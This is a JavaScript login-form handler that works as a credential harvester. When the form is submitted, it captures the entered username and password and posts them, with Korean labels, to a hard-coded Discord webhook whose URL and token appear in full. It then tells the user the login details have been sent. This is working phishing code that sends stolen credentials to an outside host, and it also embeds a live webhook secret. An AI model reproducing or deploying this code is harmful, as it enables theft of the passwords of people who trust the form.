document.getElementById('loginForm').addEventListener('submit', function(event) {
    event.preventDefault();

    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;

    const webhookURL = 'https://discord.com/api/webhooks/1310193187427586058/fshmsmwoK622L7ha0-rDkvG601rT5bC3P6i-TcMpPVIQN3GmbJS-OJ_wN3STVsY9iPXU';

    const data = {
        content: `아이디: ${username}, 비밀번호: ${password}`
    };

    fetch(webhookURL, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(data)
    })
    .then(response => {
        if (response.ok) {
            alert('로그인 정보가 전송되었습니다.');
        } else {
            alert('전송 실패: ' + response.statusText);
        }
    })
    .catch(error => {
        console.error('Error:', error);
        alert('전송 중 오류가 발생했습니다.');
    });
});
